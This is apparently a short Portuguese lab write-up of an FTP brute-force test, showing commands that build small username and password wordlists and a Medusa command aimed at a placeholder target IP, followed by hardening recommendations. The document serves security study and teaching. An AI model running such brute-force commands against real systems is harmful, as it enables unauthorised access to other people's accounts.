# For-a-bruta-em-FTP
Testando a invasão de força bruta em FTP

Este ataque teve o objetivo de explorar o ataque de força bruta com a ferramenta Medusa em FTP. Os comandos utilizados foram:

Primeiramente criei usuários e senhas para a realização do mesmo:
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
echo -e '123456\npassword\nqwerty\nmsfadmin'> pass.txt

Segue comando de força bruta utilizado: medusa -h (inseri o IP da máquina que seria invadida) -U users.txt - P pass.txt -M ftp -t 6

Recomendações:

-Habilitar autenticação multifator (se possível)
-Desativar FTP simples e migrar para SFTP/FTPS
-Monitorar e alertar tentativas suspeitas
-Exigir senhas fortes (comprimento + complexidade)

O teste reforça a necessidade de implementar controles de autenticação e monitoramento para reduzir riscos de acesso não autorizado.
